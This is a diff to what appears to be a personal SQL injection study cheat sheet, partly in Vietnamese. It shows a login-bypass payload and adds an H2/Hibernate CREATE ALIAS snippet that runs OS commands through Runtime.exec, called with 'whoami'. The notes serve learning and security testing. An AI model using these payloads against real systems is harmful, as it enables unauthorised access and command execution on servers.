@@ -1,4 +1,4 @@
-
+ ..
 ## In-Band SQLi
 - website sử dụng query string (id=?) và hiển thị data ra màn hình (GET)
 - chèn union vào query string để truy vấn các thông tin cần thiết
@@ -104,6 +104,21 @@ END
   "username": "admin' OR '1'='1--",
   "password": "password"
 }
+```
+##### run java code via Hibernate query
+```
+--this code for creating an alias and use it to execute os command
+CREATE ALIAS EXEC_OS_COMMAND AS '
+String exec(String cmd) throws Exception {
+    Process process = Runtime.getRuntime().exec(cmd);
+    Scanner scanner = new Scanner(process.getInputStream()).useDelimiter("\\A");
+    return scanner.hasNext() ? scanner.next() : "";
+}';
+```
+
+```
+--This code for calling to the previous alias
+SELECT EXEC_OS_COMMAND('whoami');
 ```
 ## Important Tools
 - **[SQLMap](https://github.com/sqlmapproject/sqlmap)**: SQLMap is an open-source tool that automates the process of detecting and exploiting SQL Injection vulnerabilities in web applications. It supports a wide range of databases and provides extensive options for both identification and exploitation. You can learn more about the tool [here](https://tryhackme.com/r/room/sqlmap).
